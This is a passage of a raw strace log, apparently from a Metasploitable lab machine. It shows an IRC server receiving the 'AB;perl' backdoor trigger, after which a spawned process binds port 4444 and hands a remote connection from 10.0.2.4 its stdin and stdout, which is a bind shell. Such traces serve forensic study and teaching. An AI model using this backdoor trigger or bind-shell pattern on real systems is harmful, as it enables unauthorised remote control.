44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8464  07:23:33.205323 close(6)          = 0
8464  07:23:33.205333 munmap(0xb7d6b000, 4096) = 0
8464  07:23:33.205377 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
8464  07:23:33.205399 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb3558) = -1 EINVAL (Invalid argument)
8464  07:23:33.205413 _llseek(6, 0, 0xbfbb35a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8464  07:23:33.205424 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb3558) = -1 EINVAL (Invalid argument)
8464  07:23:33.205435 _llseek(6, 0, 0xbfbb35a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8464  07:23:33.205445 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
8464  07:23:33.205502 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
8464  07:23:33.205537 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
8464  07:23:33.205563 listen(6, 5)      = 0
8464  07:23:33.205616 accept(6,  <unfinished ...>
8463  07:23:33.214039 exit_group(0)     = ?
8461  07:23:33.214235 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8463
8461  07:23:33.214255 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8461  07:23:33.214268 --- SIGCHLD (Child exited) @ 0 (0) ---
8461  07:23:33.214276 waitpid(-1, 0xbfced868, WNOHANG) = -1 ECHILD (No child processes)
8461  07:23:33.214327 sigreturn()       = ? (mask now [])
8461  07:23:33.214386 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8461  07:23:33.214526 exit_group(0)     = ?
4519  07:23:33.214688 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8461
4519  07:23:33.214745 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:23:33.214781 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:23:33.214817 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:23:33.214852 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:23:33.214876 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:23:33.214980 time(NULL)        = 1495625013
4519  07:23:33.215017 time(NULL)        = 1495625013
4519  07:23:33.215044 gettimeofday({1495625013, 215051}, NULL) = 0
4519  07:23:33.215063 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:23:33.215135 clock_gettime(CLOCK_MONOTONIC, {1823, 32165441}) = 0
4519  07:23:33.215181 gettimeofday({1495625013, 215187}, NULL) = 0
4519  07:23:33.215196 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 620000})
4519  07:23:33.592899 clock_gettime(CLOCK_MONOTONIC, {1823, 409919807}) = 0
4519  07:23:33.592921 recv(7, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:23:33.592949 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593019 <... accept resumed> {sa_family=AF_INET, sin_port=htons(36143), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
4519  07:23:33.593071 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593083 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:33.593088 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593118 <... ioctl resumed> , 0xbfbb2548) = -1 EINVAL (Invalid argument)
4519  07:23:33.593125 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593132 _llseek(8, 0,  <unfinished ...>
4519  07:23:33.593136 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593148 <... _llseek resumed> 0xbfbb2590, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:33.593154 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593162 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:33.593166 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593177 <... ioctl resumed> , 0xbfbb2548) = -1 EINVAL (Invalid argument)
4519  07:23:33.593182 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593189 _llseek(8, 0,  <unfinished ...>
4519  07:23:33.593193 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593205 <... _llseek resumed> 0xbfbb2590, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:33.593210 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593216 fcntl64(8, F_SETFD, FD_CLOEXEC <unfinished ...>
4519  07:23:33.593221 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593232 <... fcntl64 resumed> ) = 0
4519  07:23:33.593237 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593275 close(6 <unfinished ...>
4519  07:23:33.593281 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593297 <... close resumed> ) = 0
4519  07:23:33.593302 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593360 dup(8 <unfinished ...>
4519  07:23:33.593366 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593378 <... dup resumed> ) = 6
4519  07:23:33.593383 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593390 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:33.593395 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593406 <... ioctl resumed> , 0xbfbb33e8) = -1 EINVAL (Invalid argument)
4519  07:23:33.593412 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593419 _llseek(6, 0,  <unfinished ...>
4519  07:23:33.593423 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593433 <... _llseek resumed> 0xbfbb3430, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:33.593438 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593445 fstat64(6,  <unfinished ...>
4519  07:23:33.593449 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593460 <... fstat64 resumed> {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
4519  07:23:33.593473 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593480 dup2(6, 1 <unfinished ...>
4519  07:23:33.593484 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593496 <... dup2 resumed> ) = 1
4519  07:23:33.593501 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593519 close(6 <unfinished ...>
4519  07:23:33.593525 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593564 <... close resumed> ) = 0
4519  07:23:33.593568 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593577 fcntl64(1, F_SETFD, 0 <unfinished ...>
4519  07:23:33.593598 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593609 <... fcntl64 resumed> ) = 0
4519  07:23:33.593613 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593621 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:33.593625 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593640 <... ioctl resumed> , 0xbfbb33b8) = -1 EINVAL (Invalid argument)
4519  07:23:33.593646 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593653 _llseek(1, 0,  <unfinished ...>
4519  07:23:33.593657 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593667 <... _llseek resumed> 0xbfbb3400, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:33.593672 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593702 dup(8 <unfinished ...>
4519  07:23:33.593707 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593719 <... dup resumed> ) = 6
4519  07:23:33.593723 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593731 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:23:33.593735 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593746 <... ioctl resumed> , 0xbfbb33e8) = -1 EINVAL (Invalid argument)
4519  07:23:33.593752 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593758 _llseek(6, 0,  <unfinished ...>
4519  07:23:33.593762 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593775 <... _llseek resumed> 0xbfbb3430, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:23:33.593780 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593787 fstat64(6,  <unfinished ...>
4519  07:23:33.593791 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593801 <... fstat64 resumed> {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
4519  07:23:33.593813 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593819 dup2(6, 0 <unfinished ...>
4519  07:23:33.593866 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593878 <... dup2 resumed> ) = 0
4519  07:23:33.593883 getrusage(RUSAGE_SELF,  <unfinished ...>
8464  07:23:33.593890 close(6 <unfinished ...>
4519  07:23:33.593894 <... getrusage resumed> {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
8464  07:23:33.593912 <... close resumed> ) = 0
4519  07:23:33.593917 gettimeofday( <unfinished ...>
8464  07:23:33.593924 fcntl64(0, F_SETFD, 0 <unfinished ...>
4519  07:23:33.593928 <... gettimeofday resumed> {1495625013, 593920}, NULL) = 0
8464  07:23:33.593939 <... fcntl64 resumed> ) = 0
4519  07:23:33.593944 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
8464  07:23:33.593977 fcntl64(0, F_SETFD, 0 <unfinished ...>
4519  07:23:33.593981 <... select resumed> ) = 1 (in [5], left {1, 0})
8464  07:23:33.593999 <... fcntl64 resumed> ) = 0
4519  07:23:33.594015 clock_gettime(CLOCK_MONOTONIC,  <unfinished ...>
8464  07:23:33.594029 read(0,  <unfinished ...>
4519  07:23:33.594034 <... clock_gettime resumed> {1823, 411027939}) = 0
4519  07:23:33.594045 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:23:33.594058 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:23:33.594077 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:23:33.594093 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:23:33.594126 close(5)          = 0
4519  07:23:33.594140 time(NULL)        = 1495625013
4519  07:23:33.594149 time(NULL)        = 1495625013
4519  07:23:33.594160 gettimeofday({1495625013, 594163}, NULL) = 0
4519  07:23:33.594171 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:23:33.594200 clock_gettime(CLOCK_MONOTONIC, {1823, 411212515}) = 0
4519  07:23:33.594210 gettimeofday({1495625013, 594214}, NULL) = 0
4519  07:23:33.594220 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 620000})
4519  07:23:33.973023 clock_gettime(CLOCK_MONOTONIC, {1823, 790043539}) = 0
4519  07:23:33.973058 recv(4, "PRIVMSG  #testit Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 54
4519  07:23:33.973081 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973098 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973113 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973134 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973147 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973161 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973175 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973188 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973201 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973215 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973228 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973241 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973254 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973267 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973281 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973294 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973307 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973320 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973334 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973347 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973360 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973374 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.973400 gettimeofday({1495625013, 973425}, NULL) = 0
4519  07:23:33.973434 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
8464  07:23:34.114918 <... read resumed> "", 4096) = 0
8464  07:23:34.115125 close(8)          = 0
8464  07:23:34.115295 exit_group(0)     = ?
